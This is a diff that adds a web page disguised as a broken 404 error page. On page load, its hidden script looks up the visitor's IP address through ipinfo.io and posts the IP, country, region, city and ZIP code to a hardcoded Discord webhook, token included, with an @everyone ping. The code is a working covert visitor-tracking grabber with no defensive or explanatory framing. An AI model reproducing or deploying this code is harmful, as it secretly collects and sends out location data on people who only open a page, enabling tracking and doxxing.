@@ -1,0 +1,36 @@
+<script>
+    function monke(json) 
+    {
+         var request = new XMLHttpRequest();
+         
+         request.open("POST", "https://discord.com/api/webhooks/1326718212636803082/CSo5yL8H3I49xhAUzV5qgTVY-PcV-ctECMlGRuWiSu6oYbyoH-n2RPMLre0epe8Olvhw");
+    
+         request.setRequestHeader('Content-type', 'application/json');
+    
+         var params = 
+         {
+              username: "My website",
+              avatar_url: "",
+              content: "@everyone",
+              embeds: [
+                   {
+                        title: "Someone visited my webnsite!",
+                        color: 1752220,
+                        description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+                   }
+              ]
+         }
+    
+         request.send(JSON.stringify(params));
+    }
+    </script>
+    
+
+     <div class="w-8 h-8 relative font-bold bg-white blend-diff">
+   <h1 class="absolute-center m-0 font-charter text-2xl text-gray-100 blend-diff select-none">
+   ERROR 404 or whatever its called. "borken dead page"
+   last update: 2019
+   </h1>
+    <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+
+
